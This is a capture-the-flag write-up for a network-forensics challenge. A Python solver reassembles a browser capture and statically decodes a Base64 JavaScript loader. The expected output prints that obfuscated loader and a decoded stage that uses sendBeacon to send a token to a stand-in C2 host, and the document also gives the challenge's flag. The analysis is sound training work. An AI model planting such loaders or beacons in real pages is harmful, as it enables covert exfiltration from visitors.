# 302-web-wormhole

| | |
|---|---|
| **Category** | 03 — Orbital Oops at Mission Control |
| **Points** | 75 |

## Description

The link in that contract email did not open a contract. It opened a door. The engineer's browser went out to a "secure document portal," the portal handed back a page, the page quietly pulled down more than a page, and that is where the machine got its orders. Corporate capture had the whole exchange.

The capture holds the ordinary furniture of a web visit — a page, a stylesheet, a logo — and one thing that does not belong. The desk already skimmed the page source, found nothing but a loader, and moved on. The loader is the point. What it fetches does not read as code at a glance; it is folded up so a skim slides right past it. Unfold it.

Find what the portal actually planted.

**Flag format:** `GAIANSPACE{...}`

**Attachments:**
- `drive_by.pcap` — corporate capture of the browser visit

## Hints

Two hints were released during the event:

1. **Pull the objects** — Reassemble the files the browser downloaded. Most are harmless decoration. One is a script that does more than decorate.
2. **Folded, not written** — Searching the capture for the answer finds nothing, because the script carries its real body folded up as text. Unfold that text and read what it sets.

## Solution

### Analysis

The PCAP holds ordinary web page traffic alongside the malicious stage. The key is not just to inspect the initial HTML: the browser fetches a JavaScript loader that decodes and evaluates a second stage.

The solver reads the classic Ethernet PCAP, groups TCP segments by four-tuple, orders them by sequence number, and parses HTTP responses. It supports `Content-Length` and `Transfer-Encoding: chunked` as well as gzip-compressed response bodies. Only JavaScript responses are considered as possible loader sources.

The detection criterion is the suspicious dynamic-execution pattern `new Function(atob(...))`: it takes Base64 text, decodes it, and passes the result into JavaScript's dynamic function constructor. Unlike the original solver, the revised detector does **not** rely on knowing the literal comment `Asimov Portal loader` in advance. The extracted Base64 value is decoded for static inspection; **the script does not execute the JavaScript**.

The recovered second stage contains a `navigator.sendBeacon(...)` call to `cdn-sat-sync.net` and the flag, which is assigned to a JavaScript variable.

### Reproduction

Place `drive_by.pcap` alongside `302.py` and run:

```bash
python3 302.py
```

Expected relevant output (long Base64 value omitted here):

```text
Found suspicious Base64-to-Function loader:
/* Asimov Portal loader v3 */
(function(){var p="...";var f=new Function(atob(p));f();})();

Decoded JavaScript:
// staged beacon payload -- do not log
var cfg={c2:'cdn-sat-sync.net',id:'FOUNDATION'};
var token="GAIANSPACE{dr1ve_by_st4ged}";
navigator.sendBeacon('https://'+cfg.c2+'/b',token);

FLAG: GAIANSPACE{dr1ve_by_st4ged}
```

No third-party packages are required. The `new Function(atob(...))` pattern is an indicator for this capture, not a universal proof that any JavaScript containing it is malicious.

### Solver Code

```python
#!/usr/bin/env python3
"""Recover staged JavaScript from the GaianSpace 302 PCAP without executing it."""

# Dependencies: Python 3 standard library only.
import base64
import gzip
import re
import struct
from collections import defaultdict
from pathlib import Path

PCAP = Path(__file__).with_name('drive_by.pcap')


def tcp_streams(raw: bytes) -> dict[tuple[bytes, bytes, int, int], bytes]:
    magic = raw[:4]
    if magic == b'\xd4\xc3\xb2\xa1':
        endian = '<'
    elif magic == b'\xa1\xb2\xc3\xd4':
        endian = '>'
    else:
        raise ValueError('Unsupported PCAP magic')
    linktype = struct.unpack_from(endian + 'I', raw, 20)[0]
    if linktype != 1:
        raise ValueError('Only Ethernet PCAP is supported')
    fragments = defaultdict(list)
    offset = 24
    while offset + 16 <= len(raw):
        _, _, included, _ = struct.unpack_from(endian + 'IIII', raw, offset)
        offset += 16
        packet = raw[offset:offset + included]
        offset += included
        if len(packet) < 54 or packet[12:14] != b'\x08\x00':
            continue
        ip = packet[14:]
        ihl = int(ip[0] & 15) * 4
        if ip[9] != 6 or len(ip) < ihl + 20:
            continue
        total_length = struct.unpack_from('!H', ip, 2)[0]
        tcp = ip[ihl:total_length]
        header_len = int(tcp[12] >> 4) * 4
        if len(tcp) < header_len:
            continue
        payload = tcp[header_len:]
        if not payload:
            continue
        src_port, dst_port, seq = struct.unpack_from('!HHI', tcp)
        key = (ip[12:16], ip[16:20], src_port, dst_port)
        fragments[key].append((seq, payload))
    streams = {}
    for key, parts in fragments.items():
        ordered = sorted(parts)
        output = bytearray()
        current_end = ordered[0][0]
        for sequence, payload in ordered:
            overlap = current_end - sequence
            if overlap < 0:
                raise ValueError(f'Missing TCP segment in {key}')
            if overlap < len(payload):
                output.extend(payload[max(0, overlap):])
                current_end = sequence + len(payload)
        streams[key] = bytes(output)
    return streams


def dechunk(data: bytes) -> tuple[bytes, int]:
    cursor = 0
    chunks = bytearray()
    while True:
        line_end = data.find(b'\r\n', cursor)
        if line_end < 0:
            raise ValueError('Incomplete chunk size')
        size = int(data[cursor:line_end].split(b';')[0], 16)
        cursor = line_end + 2
        if size == 0:
            if data[cursor:cursor + 2] == b'\r\n':
                return bytes(chunks), cursor + 2
            trailer_end = data.find(b'\r\n\r\n', cursor)
            if trailer_end < 0:
                raise ValueError('Incomplete chunk trailer')
            return bytes(chunks), trailer_end + 4
        chunks.extend(data[cursor:cursor + size])
        cursor += size
        if data[cursor:cursor + 2] != b'\r\n':
            raise ValueError('Bad chunk framing')
        cursor += 2


def http_responses(stream: bytes):
    cursor = 0
    while cursor < len(stream):
        start = stream.find(b'HTTP/1.', cursor)
        if start < 0:
            break
        header_end = stream.find(b'\r\n\r\n', start)
        if header_end < 0:
            break
        header = stream[start:header_end]
        fields = {}
        for line in header.split(b'\r\n')[1:]:
            if b':' in line:
                k, v = line.split(b':', 1)
                fields[k.lower()] = v.strip().lower()
        body_start = header_end + 4
        if b'chunked' in fields.get(b'transfer-encoding', b''):
            body, consumed = dechunk(stream[body_start:])
        elif b'content-length' in fields:
            consumed = int(fields[b'content-length'])
            body = stream[body_start:body_start + consumed]
        else:
            cursor = body_start
            continue
        cursor = body_start + consumed
        if b'gzip' in fields.get(b'content-encoding', b''):
            body = gzip.decompress(body)
        yield header, body


def main() -> None:
    streams = tcp_streams(PCAP.read_bytes())
    for key, stream in streams.items():
        if key[2] != 80:
            continue
        for header, body in http_responses(stream):
            if b'javascript' not in header.lower():
                continue
            print(f'HTTP JavaScript body: {len(body)} bytes, TCP {key[2]} -> {key[3]}')
            # Flag dynamically evaluated Base64 payloads, not known comment strings.
            if re.search(rb'new\s+Function\s*\(\s*atob\s*\(', body) is None:
                continue
            print('Found suspicious Base64-to-Function loader:')
            print(body.decode('utf-8', errors='replace')[:1000])
            match = re.search(rb'\b(?:var|let|const)\s+p\s*=\s*["\']([^"\']+)["\']', body)
            if not match:
                raise RuntimeError('Loader found but base64 declaration differs')
            decoded = base64.b64decode(match.group(1), validate=True)
            print('\nDecoded JavaScript:\n', decoded.decode('utf-8', errors='replace'))
            flag = re.search(rb'GAIANSPACE\{[^}]+\}', decoded)
            if flag:
                print('\nFLAG:', flag.group(0).decode('ascii'))
            return
    raise RuntimeError('Malicious loader not found')

if __name__ == '__main__':
    main()
```

## Flag

```text
GAIANSPACE{dr1ve_by_st4ged}
```
